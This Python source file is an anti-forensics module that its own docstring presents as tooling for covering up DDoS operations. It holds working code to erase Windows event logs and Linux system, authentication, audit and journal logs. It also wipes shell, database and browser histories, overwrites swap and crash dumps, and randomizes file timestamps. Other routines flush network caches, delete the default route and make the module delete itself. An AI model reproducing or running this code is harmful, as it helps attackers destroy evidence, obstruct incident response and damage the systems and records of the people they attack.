"""
Anti-Forensics Module
Advanced evidence elimination and trace removal for DDoS operations
"""

import os
import sys
import time
import shutil
import tempfile
import threading
import subprocess
import platform
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from pathlib import Path
import hashlib
import random
import string

from core.logger import logger


@dataclass
class ForensicsConfig:
    """Configuration for anti-forensics features"""
    # File System Cleaning
    secure_delete_files: bool = True
    overwrite_passes: int = 3  # Number of overwrite passes
    clean_temp_files: bool = True
    clean_log_files: bool = True
    clean_cache_files: bool = True
    
    # Memory Cleaning
    clear_memory_dumps: bool = True
    disable_swap_files: bool = True
    clear_process_memory: bool = True
    
    # Registry Cleaning (Windows)
    clean_registry_traces: bool = True
    clean_recent_files: bool = True
    clean_run_history: bool = True
    
    # Network Traces
    clear_dns_cache: bool = True
    clear_arp_cache: bool = True
    clear_routing_tables: bool = True
    clear_connection_logs: bool = True
    
    # System Logs
    clear_system_logs: bool = True
    clear_security_logs: bool = True
    clear_application_logs: bool = True
    
    # Timestamps
    randomize_timestamps: bool = True
    preserve_original_timestamps: bool = False
    
    # Process Hiding
    hide_process_name: bool = True
    spoof_process_info: bool = True
    
    # Auto-cleanup
    auto_cleanup_on_exit: bool = True
    cleanup_interval: int = 300  # seconds
    emergency_cleanup_trigger: bool = True


class SecureFileManager:
    """Secure file operations and deletion"""
    
    def __init__(self, config: ForensicsConfig):
        self.config = config
        
    def secure_delete_file(self, file_path: str) -> bool:
        """Securely delete a file with multiple overwrite passes"""
        if not os.path.exists(file_path):
            return True
            
        try:
            file_size = os.path.getsize(file_path)
            
            # Multiple overwrite passes
            with open(file_path, 'r+b') as f:
                for pass_num in range(self.config.overwrite_passes):
                    f.seek(0)
                    
                    if pass_num == 0:
                        # First pass: all zeros
                        f.write(b'\x00' * file_size)
                    elif pass_num == 1:
                        # Second pass: all ones
                        f.write(b'\xFF' * file_size)
                    else:
                        # Random data
                        f.write(os.urandom(file_size))
                    
                    f.flush()
                    os.fsync(f.fileno())
            
            # Remove the file
            os.remove(file_path)
            logger.debug(f"Securely deleted file: {file_path}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to securely delete {file_path}: {e}")
            return False
    
    def secure_delete_directory(self, dir_path: str) -> bool:
        """Securely delete entire directory"""
        if not os.path.exists(dir_path):
            return True
            
        try:
            # Recursively delete all files
            for root, dirs, files in os.walk(dir_path, topdown=False):
                for file in files:
                    file_path = os.path.join(root, file)
                    self.secure_delete_file(file_path)
                
                for dir in dirs:
                    dir_path_full = os.path.join(root, dir)
                    try:
                        os.rmdir(dir_path_full)
                    except:
                        pass
            
            # Remove the main directory
            os.rmdir(dir_path)
            logger.debug(f"Securely deleted directory: {dir_path}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to securely delete directory {dir_path}: {e}")
            return False
    
    def wipe_free_space(self, drive_path: str = None) -> bool:
        """Wipe free space on drive"""
        try:
            if not drive_path:
                drive_path = os.getcwd()
            
            # Create temporary file to fill free space
            temp_file = os.path.join(drive_path, f"wipe_{random.randint(1000, 9999)}.tmp")
            
            try:
                with open(temp_file, 'wb') as f:
                    # Write random data until disk is full
                    chunk_size = 1024 * 1024  # 1MB chunks
                    while True:
                        try:
                            f.write(os.urandom(chunk_size))
                        except OSError:
                            # Disk full
                            break
                
                # Delete the temporary file
                self.secure_delete_file(temp_file)
                logger.info("Free space wiped successfully")
                return True
                
            except Exception as e:
                # Clean up temp file if it exists
                if os.path.exists(temp_file):
                    try:
                        os.remove(temp_file)
                    except:
                        pass
                raise e
                
        except Exception as e:
            logger.error(f"Failed to wipe free space: {e}")
            return False


class MemoryManager:
    """Memory cleaning and protection"""
    
    def __init__(self, config: ForensicsConfig):
        self.config = config
        
    def clear_process_memory(self) -> bool:
        """Clear current process memory"""
        try:
            import gc
            import ctypes
            
            # Force garbage collection
            gc.collect()
            
            # Clear Python object cache
            sys.intern.clear()
            
            # Platform-specific memory clearing
            if platform.system() == "Windows":
                return self._clear_windows_memory()
            else:
                return self._clear_unix_memory()
                
        except Exception as e:
            logger.error(f"Failed to clear process memory: {e}")
            return False
    
    def _clear_windows_memory(self) -> bool:
        """Clear memory on Windows"""
        try:
            import ctypes
            from ctypes import wintypes
            
            # Get current process handle
            kernel32 = ctypes.windll.kernel32
            process_handle = kernel32.GetCurrentProcess()
            
            # Set working set size to minimum
            kernel32.SetProcessWorkingSetSize(process_handle, -1, -1)
            
            return True
        except:
            return False
    
    def _clear_unix_memory(self) -> bool:
        """Clear memory on Unix systems - Linux compatible"""
        try:
            # Force garbage collection first
            import gc
            gc.collect()
            
            # Linux-specific memory clearing
            if sys.platform.startswith('linux'):
                # Sync filesystem buffers
                try:
                    subprocess.run(['sync'], check=False, timeout=10)
                except (subprocess.TimeoutExpired, FileNotFoundError):
                    pass
                
                # Clear page cache, dentries and inodes (requires root)
                try:
                    # Try to clear caches if we have permission
                    cache_files = [
                        '/proc/sys/vm/drop_caches',
                        '/proc/sys/vm/compact_memory'
                    ]
                    
                    for cache_file in cache_files:
                        if os.path.exists(cache_file):
                            try:
                                with open(cache_file, 'w') as f:
                                    if 'drop_caches' in cache_file:
                                        f.write('3')  # Clear all caches
                                    else:
                                        f.write('1')  # Compact memory
                            except PermissionError:
                                logger.debug(f"No permission to write to {cache_file}")
                            except Exception:
                                pass
                except Exception:
                    pass
                
                # Clear shared memory segments
                try:
                    subprocess.run(['ipcrm', '-M', '0x0'], 
                                 check=False, capture_output=True, timeout=5)
                except (subprocess.TimeoutExpired, FileNotFoundError):
                    pass
                
                # Clear memory mapped files
                try:
                    # Force memory mapping cleanup
                    import mmap
                    # This is handled by garbage collection
                    pass
                except Exception:
                    pass
            
            return True
        except Exception as e:
            logger.debug(f"Unix memory clearing failed: {e}")
            return False
    
    def disable_swap_files(self) -> bool:
        """Disable swap files to prevent memory dumps - Linux compatible"""
        try:
            if sys.platform.startswith('linux'):
                # Linux swap management
                try:
                    # Check current swap status
                    result = subprocess.run(['swapon', '--show'], 
                                          capture_output=True, text=True, timeout=10)
                    
                    if result.returncode == 0 and result.stdout.strip():
                        # Disable all swap
                        subprocess.run(['swapoff', '-a'], 
                                     check=False, capture_output=True, timeout=30)
                        logger.info("Linux swap disabled")
                    else:
                        logger.debug("No active swap found on Linux")
                        
                except (subprocess.TimeoutExpired, FileNotFoundError):
                    logger.debug("Swap management tools not available")
                
                # Clear swap file contents if they exist
                try:
                    # Common swap file locations
                    swap_locations = [
                        '/swapfile',
                        '/swap.img',
                        '/var/swap'
                    ]
                    
                    for swap_file in swap_locations:
                        if os.path.exists(swap_file):
                            try:
                                # Overwrite swap file with zeros (requires root)
                                subprocess.run(['dd', 'if=/dev/zero', f'of={swap_file}', 'bs=1M'], 
                                             check=False, capture_output=True, timeout=60)
                            except (subprocess.TimeoutExpired, FileNotFoundError, PermissionError):
                                pass
                                
                except Exception:
                    pass
                    
            elif platform.system() == "Windows":
                # Windows page file management
                try:
                    subprocess.run([
                        'wmic', 'computersystem', 'where', 'name="%computername%"',
                        'set', 'AutomaticManagedPagefile=False'
                    ], check=False, capture_output=True, timeout=30)
                    logger.info("Windows page file disabled")
                except (subprocess.TimeoutExpired, FileNotFoundError):
                    logger.debug("WMIC not available for page file management")
            
            return True
            
        except Exception as e:
            logger.error(f"Failed to disable swap files: {e}")
            return False
            
            logger.info("Swap files disabled")
            return True
            
        except Exception as e:
            logger.error(f"Failed to disable swap files: {e}")
            return False
    
    def clear_memory_dumps(self) -> bool:
        """Clear existing memory dump files"""
        try:
            dump_locations = []
            
            if platform.system() == "Windows":
                dump_locations = [
                    "C:\\Windows\\MEMORY.DMP",
                    "C:\\Windows\\Minidump\\",
                    f"C:\\Users\\{os.getenv('USERNAME')}\\AppData\\Local\\CrashDumps\\"
                ]
            else:
                dump_locations = [
                    "/var/crash/",
                    "/tmp/core.*",
                    "/core"
                ]
            
            secure_file_manager = SecureFileManager(self.config)
            
            for location in dump_locations:
                if os.path.isfile(location):
                    secure_file_manager.secure_delete_file(location)
                elif os.path.isdir(location):
                    secure_file_manager.secure_delete_directory(location)
            
            logger.info("Memory dumps cleared")
            return True
            
        except Exception as e:
            logger.error(f"Failed to clear memory dumps: {e}")
            return False


class SystemLogManager:
    """System log cleaning and management"""
    
    def __init__(self, config: ForensicsConfig):
        self.config = config
        
    def clear_all_logs(self) -> bool:
        """Clear all system logs"""
        success = True
        
        if self.config.clear_system_logs:
            success &= self.clear_system_logs()
        
        if self.config.clear_security_logs:
            success &= self.clear_security_logs()
        
        if self.config.clear_application_logs:
            success &= self.clear_application_logs()
        
        return success
    
    def clear_system_logs(self) -> bool:
        """Clear system logs"""
        try:
            if platform.system() == "Windows":
                return self._clear_windows_system_logs()
            else:
                return self._clear_unix_system_logs()
        except Exception as e:
            logger.error(f"Failed to clear system logs: {e}")
            return False
    
    def _clear_windows_system_logs(self) -> bool:
        """Clear Windows system logs"""
        try:
            log_names = [
                "System", "Application", "Security", 
                "Setup", "ForwardedEvents"
            ]
            
            for log_name in log_names:
                try:
                    subprocess.run([
                        'wevtutil', 'cl', log_name
                    ], check=False, capture_output=True, timeout=30)
                except (subprocess.TimeoutExpired, FileNotFoundError):
                    pass
            
            logger.info("Windows system logs cleared")
            return True
            
        except Exception as e:
            logger.error(f"Failed to clear Windows system logs: {e}")
            return False
    
    def _clear_unix_system_logs(self) -> bool:
        """Clear Unix system logs - Linux compatible"""
        try:
            success = True
            
            if sys.platform.startswith('linux'):
                # Linux-specific log locations
                log_files = [
                    '/var/log/syslog',
                    '/var/log/messages',
                    '/var/log/kern.log',
                    '/var/log/auth.log',
                    '/var/log/secure',
                    '/var/log/daemon.log',
                    '/var/log/mail.log',
                    '/var/log/cron.log',
                    '/var/log/boot.log',
                    '/var/log/dmesg',
                    '/var/log/lastlog',
                    '/var/log/wtmp',
                    '/var/log/btmp',
                    '/var/log/utmp'
                ]
                
                # Clear systemd journal logs
                try:
                    subprocess.run(['journalctl', '--flush'], 
                                 check=False, capture_output=True, timeout=30)
                    subprocess.run(['journalctl', '--rotate'], 
                                 check=False, capture_output=True, timeout=30)
                    subprocess.run(['journalctl', '--vacuum-time=1s'], 
                                 check=False, capture_output=True, timeout=30)
                    logger.debug("Systemd journal logs cleared")
                except (subprocess.TimeoutExpired, FileNotFoundError):
                    logger.debug("Systemd journal tools not available")
                
                # Clear rsyslog files
                secure_file_manager = SecureFileManager(self.config)
                for log_file in log_files:
                    if os.path.exists(log_file):
                        try:
                            # Truncate log file instead of deleting (maintains file structure)
                            with open(log_file, 'w') as f:
                                f.truncate(0)
                            logger.debug(f"Cleared log file: {log_file}")
                        except PermissionError:
                            logger.debug(f"No permission to clear {log_file}")
                        except Exception as e:
                            logger.debug(f"Failed to clear {log_file}: {e}")
                            success = False
                
                # Clear log directories
                log_dirs = [
                    '/var/log/apache2',
                    '/var/log/nginx',
                    '/var/log/mysql',
                    '/var/log/postgresql',
                    '/var/log/audit'
                ]
                
                for log_dir in log_dirs:
                    if os.path.exists(log_dir) and os.path.isdir(log_dir):
                        try:
                            for root, dirs, files in os.walk(log_dir):
                                for file in files:
                                    file_path = os.path.join(root, file)
                                    try:
                                        with open(file_path, 'w') as f:
                                            f.truncate(0)
                                    except (PermissionError, Exception):
                                        pass
                        except Exception:
                            pass
                
                # Clear user-specific logs
                try:
                    user_home = os.path.expanduser('~')
                    user_logs = [
                        f'{user_home}/.bash_history',
                        f'{user_home}/.zsh_history',
                        f'{user_home}/.python_history',
                        f'{user_home}/.mysql_history',
                        f'{user_home}/.psql_history',
                        f'{user_home}/.lesshst',
                        f'{user_home}/.viminfo'
                    ]
                    
                    for user_log in user_logs:
                        if os.path.exists(user_log):
                            try:
                                with open(user_log, 'w') as f:
                                    f.truncate(0)
                            except Exception:
                                pass
                                
                except Exception:
                    pass
                    
            else:
                # Generic Unix fallback
                log_files = [
                    '/var/log/system.log',
                    '/var/log/messages',
                    '/var/log/secure'
                ]
                
                for log_file in log_files:
                    if os.path.exists(log_file):
                        try:
                            with open(log_file, 'w') as f:
                                f.truncate(0)
                        except Exception:
                            success = False
            
            if success:
                logger.info("Unix system logs cleared")
            return success
            
        except Exception as e:
            logger.error(f"Failed to clear Unix system logs: {e}")
            return False
    
    def clear_security_logs(self) -> bool:
        """Clear security-related logs"""
        try:
            if platform.system() == "Windows":
                subprocess.run([
                    'wevtutil', 'cl', 'Security'
                ], check=False, capture_output=True)
            else:
                secure_file_manager = SecureFileManager(self.config)
                security_logs = [
                    "/var/log/auth.log*",
                    "/var/log/secure*",
                    "/var/log/faillog",
                    "/var/log/lastlog"
                ]
                
                import glob
                for log_pattern in security_logs:
                    for log_file in glob.glob(log_pattern):
                        secure_file_manager.secure_delete_file(log_file)
            
            logger.info("Security logs cleared")
            return True
        except:
            return False
    
    def clear_application_logs(self) -> bool:
        """Clear application logs"""
        try:
            if platform.system() == "Windows":
                subprocess.run([
                    'wevtutil', 'cl', 'Application'
                ], check=False, capture_output=True)
            else:
                # Clear common application log directories
                app_log_dirs = [
                    "/var/log/apache2/",
                    "/var/log/nginx/",
                    "/var/log/mysql/",
                    "/tmp/",
                    f"{os.path.expanduser('~')}/.cache/"
                ]
                
                secure_file_manager = SecureFileManager(self.config)
                
                for log_dir in app_log_dirs:
                    if os.path.exists(log_dir):
                        for root, dirs, files in os.walk(log_dir):
                            for file in files:
                                if file.endswith(('.log', '.tmp')):
                                    file_path = os.path.join(root, file)
                                    secure_file_manager.secure_delete_file(file_path)
            
            logger.info("Application logs cleared")
            return True
        except:
            return False


class NetworkTraceManager:
    """Network trace cleaning"""
    
    def __init__(self, config: ForensicsConfig):
        self.config = config
        
    def clear_all_network_traces(self) -> bool:
        """Clear all network traces"""
        success = True
        
        if self.config.clear_dns_cache:
            success &= self.clear_dns_cache()
        
        if self.config.clear_arp_cache:
            success &= self.clear_arp_cache()
        
        if self.config.clear_routing_tables:
            success &= self.clear_routing_tables()
        
        return success
    
    def clear_dns_cache(self) -> bool:
        """Clear DNS cache"""
        try:
            if platform.system() == "Windows":
                subprocess.run(['ipconfig', '/flushdns'], check=True, capture_output=True)
            else:
                # Clear systemd-resolved cache
                subprocess.run(['systemctl', 'flush-dns'], check=False, capture_output=True)
                # Clear nscd cache
                subprocess.run(['nscd', '-i', 'hosts'], check=False, capture_output=True)
            
            logger.info("DNS cache cleared")
            return True
        except:
            return False
    
    def clear_arp_cache(self) -> bool:
        """Clear ARP cache"""
        try:
            if platform.system() == "Windows":
                subprocess.run(['arp', '-d', '*'], check=False, capture_output=True)
            else:
                subprocess.run(['ip', 'neigh', 'flush', 'all'], check=False, capture_output=True)
            
            logger.info("ARP cache cleared")
            return True
        except:
            return False
    
    def clear_routing_tables(self) -> bool:
        """Clear routing table entries"""
        try:
            if platform.system() == "Windows":
                # Clear routing table (be careful with this)
                subprocess.run(['route', 'delete', '0.0.0.0'], check=False, capture_output=True)
            else:
                # Flush routing cache
                subprocess.run(['ip', 'route', 'flush', 'cache'], check=False, capture_output=True)
            
            logger.info("Routing tables cleared")
            return True
        except:
            return False


class RegistryManager:
    """Registry/Configuration cleaning (Cross-platform)"""
    
    def __init__(self, config: ForensicsConfig):
        self.config = config
        
    def clear_registry_traces(self) -> bool:
        """Clear system configuration traces - Linux compatible"""
        try:
            success = True
            
            if platform.system() == "Windows":
                # Windows registry operations
                if self.config.clean_recent_files:
                    success &= self._clear_recent_files()
                
                if self.config.clean_run_history:
                    success &= self._clear_run_history()
            else:
                # Linux configuration cleaning
                if self.config.clean_recent_files:
                    success &= self._clear_linux_recent_files()
                
                if self.config.clean_run_history:
                    success &= self._clear_linux_command_history()
            
            return success
        except Exception as e:
            logger.error(f"Failed to clear registry/config traces: {e}")
            return False
    
    def _clear_recent_files(self) -> bool:
        """Clear recent files from Windows registry"""
        try:
            import winreg
            
            # Clear recent documents
            key_paths = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
            ]
            
            for key_path in key_paths:
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
                    
                    # Enumerate and delete all values
                    i = 0
                    while True:
                        try:
                            value_name = winreg.EnumValue(key, i)[0]
                            winreg.DeleteValue(key, value_name)
                        except WindowsError:
                            break
                    
                    winreg.CloseKey(key)
                except Exception:
                    pass
            
            logger.info("Recent files cleared from registry")
            return True
        except Exception:
            return False
    
    def _clear_linux_recent_files(self) -> bool:
        """Clear recent files from Linux desktop environments"""
        try:
            user_home = os.path.expanduser('~')
            success = True
            
            # GNOME recent files
            gnome_recent_files = [
                f'{user_home}/.local/share/recently-used.xbel',
                f'{user_home}/.recently-used.xbel',
                f'{user_home}/.gtk-bookmarks'
            ]
            
            # KDE recent files
            kde_recent_dirs = [
                f'{user_home}/.kde/share/apps/RecentDocuments',
                f'{user_home}/.kde4/share/apps/RecentDocuments',
                f'{user_home}/.local/share/RecentDocuments'
            ]
            
            # Clear GNOME recent files
            for recent_file in gnome_recent_files:
                if os.path.exists(recent_file):
                    try:
                        with open(recent_file, 'w') as f:
                            f.truncate(0)
                        logger.debug(f"Cleared recent file: {recent_file}")
                    except Exception as e:
                        logger.debug(f"Failed to clear {recent_file}: {e}")
                        success = False
            
            # Clear KDE recent files
            for recent_dir in kde_recent_dirs:
                if os.path.exists(recent_dir) and os.path.isdir(recent_dir):
                    try:
                        for file in os.listdir(recent_dir):
                            file_path = os.path.join(recent_dir, file)
                            if os.path.isfile(file_path):
                                os.remove(file_path)
                        logger.debug(f"Cleared recent directory: {recent_dir}")
                    except Exception as e:
                        logger.debug(f"Failed to clear {recent_dir}: {e}")
                        success = False
            
            # Clear application-specific recent files
            app_recent_files = [
                f'{user_home}/.config/libreoffice/4/user/registrymodifications.xcu',
                f'{user_home}/.mozilla/firefox/*/places.sqlite',
                f'{user_home}/.config/google-chrome/Default/History',
                f'{user_home}/.config/chromium/Default/History'
            ]
            
            import glob
            for pattern in app_recent_files:
                for file_path in glob.glob(pattern):
                    if os.path.exists(file_path):
                        try:
                            if file_path.endswith('.sqlite') or file_path.endswith('History'):
                                # For database files, just truncate
                                with open(file_path, 'w') as f:
                                    f.truncate(0)
                            else:
                                os.remove(file_path)
                            logger.debug(f"Cleared app recent file: {file_path}")
                        except Exception as e:
                            logger.debug(f"Failed to clear {file_path}: {e}")
            
            if success:
                logger.info("Linux recent files cleared")
            return success
            
        except Exception as e:
            logger.error(f"Failed to clear Linux recent files: {e}")
            return False
    
    def _clear_run_history(self) -> bool:
        """Clear Windows run command history"""
        try:
            import winreg
            
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
            
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
                
                # Delete all run history
                i = 0
                while True:
                    try:
                        value_name = winreg.EnumValue(key, i)[0]
                        winreg.DeleteValue(key, value_name)
                    except WindowsError:
                        break
                
                winreg.CloseKey(key)
            except Exception:
                pass
            
            logger.info("Run history cleared from registry")
            return True
        except Exception:
            return False
    
    def _clear_linux_command_history(self) -> bool:
        """Clear Linux command history and application run history"""
        try:
            user_home = os.path.expanduser('~')
            success = True
            
            # Shell history files
            history_files = [
                f'{user_home}/.bash_history',
                f'{user_home}/.zsh_history',
                f'{user_home}/.fish_history',
                f'{user_home}/.csh_history',
                f'{user_home}/.tcsh_history',
                f'{user_home}/.ksh_history'
            ]
            
            # Application history files
            app_history_files = [
                f'{user_home}/.python_history',
                f'{user_home}/.mysql_history',
                f'{user_home}/.psql_history',
                f'{user_home}/.sqlite_history',
                f'{user_home}/.redis_history',
                f'{user_home}/.node_repl_history',
                f'{user_home}/.lesshst',
                f'{user_home}/.viminfo',
                f'{user_home}/.nano_history'
            ]
            
            # Desktop environment run history
            de_history_files = [
                f'{user_home}/.local/share/applications/mimeapps.list',
                f'{user_home}/.config/mimeapps.list'
            ]
            
            all_history_files = history_files + app_history_files + de_history_files
            
            for history_file in all_history_files:
                if os.path.exists(history_file):
                    try:
                        with open(history_file, 'w') as f:
                            f.truncate(0)
                        logger.debug(f"Cleared history file: {history_file}")
                    except Exception as e:
                        logger.debug(f"Failed to clear {history_file}: {e}")
                        success = False
            
            # Clear systemd user session logs
            try:
                subprocess.run(['journalctl', '--user', '--flush'], 
                             check=False, capture_output=True, timeout=30)
                subprocess.run(['journalctl', '--user', '--rotate'], 
                             check=False, capture_output=True, timeout=30)
                subprocess.run(['journalctl', '--user', '--vacuum-time=1s'], 
                             check=False, capture_output=True, timeout=30)
                logger.debug("User systemd logs cleared")
            except (subprocess.TimeoutExpired, FileNotFoundError):
                logger.debug("User systemd journal tools not available")
            
            # Clear desktop environment caches
            cache_dirs = [
                f'{user_home}/.cache',
                f'{user_home}/.thumbnails',
                f'{user_home}/.local/share/Trash'
            ]
            
            for cache_dir in cache_dirs:
                if os.path.exists(cache_dir) and os.path.isdir(cache_dir):
                    try:
                        for root, dirs, files in os.walk(cache_dir):
                            for file in files:
                                file_path = os.path.join(root, file)
                                try:
                                    os.remove(file_path)
                                except Exception:
                                    pass
                        logger.debug(f"Cleared cache directory: {cache_dir}")
                    except Exception as e:
                        logger.debug(f"Failed to clear {cache_dir}: {e}")
            
            if success:
                logger.info("Linux command history cleared")
            return success
            
        except Exception as e:
            logger.error(f"Failed to clear Linux command history: {e}")
            return False


class TimestampManager:
    """File timestamp manipulation"""
    
    def __init__(self, config: ForensicsConfig):
        self.config = config
        
    def randomize_file_timestamps(self, file_path: str) -> bool:
        """Randomize file timestamps"""
        if not self.config.randomize_timestamps:
            return True
            
        try:
            # Generate random timestamps within the last year
            import datetime
            
            now = time.time()
            year_ago = now - (365 * 24 * 60 * 60)
            
            random_time = random.uniform(year_ago, now)
            
            # Set access and modification times
            os.utime(file_path, (random_time, random_time))
            
            logger.debug(f"Randomized timestamps for: {file_path}")
            return True
        except:
            return False
    
    def copy_timestamps(self, source_file: str, target_file: str) -> bool:
        """Copy timestamps from source to target file"""
        try:
            stat = os.stat(source_file)
            os.utime(target_file, (stat.st_atime, stat.st_mtime))
            return True
        except:
            return False


class AntiForensicsManager:
    """Main anti-forensics manager"""
    
    def __init__(self, config: ForensicsConfig = None):
        self.config = config or ForensicsConfig()
        self.file_manager = SecureFileManager(self.config)
        self.memory_manager = MemoryManager(self.config)
        self.log_manager = SystemLogManager(self.config)
        self.network_manager = NetworkTraceManager(self.config)
        self.registry_manager = RegistryManager(self.config)
        self.timestamp_manager = TimestampManager(self.config)
        
        self.cleanup_thread = None
        self.is_cleaning = False
        
    def enable_anti_forensics(self) -> bool:
        """Enable all anti-forensics features"""
        logger.info("Enabling anti-forensics protection...")
        
        success = True
        
        # Clear existing traces
        success &= self.perform_full_cleanup()
        
        # Start automatic cleanup
        if self.config.auto_cleanup_on_exit:
            self.start_auto_cleanup()
        
        logger.info(f"Anti-forensics {'enabled' if success else 'partially enabled'}")
        return success
    
    def perform_full_cleanup(self) -> bool:
        """Perform complete forensics cleanup"""
        logger.info("Performing full forensics cleanup...")
        
        success = True
        
        # Clear memory
        if self.config.clear_memory_dumps:
            success &= self.memory_manager.clear_memory_dumps()
        
        if self.config.clear_process_memory:
            success &= self.memory_manager.clear_process_memory()
        
        # Clear logs
        success &= self.log_manager.clear_all_logs()
        
        # Clear network traces
        success &= self.network_manager.clear_all_network_traces()
        
        # Clear registry (Windows)
        if self.config.clean_registry_traces:
            success &= self.registry_manager.clear_registry_traces()
        
        # Clear temporary files
        if self.config.clean_temp_files:
            success &= self._clear_temp_files()
        
        logger.info(f"Full cleanup {'completed' if success else 'completed with errors'}")
        return success
    
    def _clear_temp_files(self) -> bool:
        """Clear temporary files"""
        try:
            temp_dirs = [
                tempfile.gettempdir(),
                os.path.expanduser("~/.cache"),
                "/tmp" if platform.system() != "Windows" else None
            ]
            
            for temp_dir in temp_dirs:
                if temp_dir and os.path.exists(temp_dir):
                    for root, dirs, files in os.walk(temp_dir):
                        for file in files:
                            if file.startswith(('tmp', 'temp', '~')):
                                file_path = os.path.join(root, file)
                                self.file_manager.secure_delete_file(file_path)
            
            logger.info("Temporary files cleared")
            return True
        except:
            return False
    
    def emergency_cleanup(self):
        """Emergency cleanup procedure"""
        logger.warning("Executing emergency cleanup...")
        
        # Immediate memory clearing
        self.memory_manager.clear_process_memory()
        
        # Clear critical logs
        self.log_manager.clear_security_logs()
        
        # Clear network traces
        self.network_manager.clear_dns_cache()
        self.network_manager.clear_arp_cache()
        
        # Self-destruct (delete own files)
        current_file = os.path.abspath(__file__)
        self.file_manager.secure_delete_file(current_file)
        
        logger.warning("Emergency cleanup completed")
    
    def start_auto_cleanup(self):
        """Start automatic cleanup thread"""
        self.is_cleaning = True
        self.cleanup_thread = threading.Thread(target=self._cleanup_worker)
        self.cleanup_thread.daemon = True
        self.cleanup_thread.start()
        
        logger.info(f"Started auto-cleanup (interval: {self.config.cleanup_interval}s)")
    
    def _cleanup_worker(self):
        """Cleanup worker thread"""
        while self.is_cleaning:
            time.sleep(self.config.cleanup_interval)
            
            if not self.is_cleaning:
                break
            
            # Perform periodic cleanup
            self.memory_manager.clear_process_memory()
            self._clear_temp_files()
    
    def stop_auto_cleanup(self):
        """Stop automatic cleanup"""
        self.is_cleaning = False
        if self.cleanup_thread:
            self.cleanup_thread.join(timeout=5)
    
    def __enter__(self):
        self.enable_anti_forensics()
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.config.auto_cleanup_on_exit:
            self.perform_full_cleanup()
        self.stop_auto_cleanup()